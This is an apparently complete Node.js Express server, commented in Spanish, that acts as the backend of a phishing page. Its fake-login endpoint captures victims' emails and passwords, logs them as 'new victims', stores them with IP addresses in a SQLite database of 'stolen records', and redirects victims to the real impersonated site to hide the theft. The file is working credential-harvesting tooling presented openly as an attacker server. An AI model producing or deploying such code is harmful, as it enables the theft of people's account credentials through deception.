const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
const PORT = 3000;

// Configurar Express para procesar JSON y servir la carpeta 'public'
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// 1. Inicializar la base de datos SQLite (se creará un archivo local)
const db = new sqlite3.Database('./registros_robados.db', (err) => {
    if (err) console.error("Error al abrir DB:", err);
    else console.log("📦 Base de datos SQLite conectada.");
});

// Crear la tabla si no existe
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS credenciales (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT,
        password TEXT,
        ip TEXT,
        fecha TEXT
    )`);
});

// 2. El Endpoint "Malicioso" que captura los datos
app.post('/api/login-falso', (req, res) => {
    const { email, password } = req.body;
    const ip = req.ip || req.socket.remoteAddress;
    const fecha = new Date().toLocaleString();

    console.log(`\n🚨 [NUEVA VÍCTIMA] Datos recibidos de IP: ${ip}`);
    console.log(`   Email: ${email}`);
    console.log(`   Pass:  ${password}`);

    // Insertar en SQLite
    const stmt = db.prepare("INSERT INTO credenciales (email, password, ip, fecha) VALUES (?, ?, ?, ?)");
    stmt.run(email, password, ip, fecha, function(err) {
        if (err) {
            console.error("Error al guardar en BD:", err);
            return res.status(500).json({ error: "Error interno" });
        }
        
        console.log(`💾 Guardado en base de datos. ID de fila: ${this.lastID}`);
        
        // 3. Ordenar al navegador que redirija al sitio real
        // En una API REST, enviamos la URL al frontend para que este haga la redirección
        res.json({ 
            status: "success", 
            redirectUrl: "https://www.google.com" // Aquí iría la web real suplantada
        });
    });
    stmt.finalize();
});

// Iniciar servidor
app.listen(PORT, () => {
    console.log("=========================================");
    console.log(`💻 Servidor atacante en http://localhost:${PORT}`);
    console.log("=========================================");
    console.log("Esperando conexiones...");
});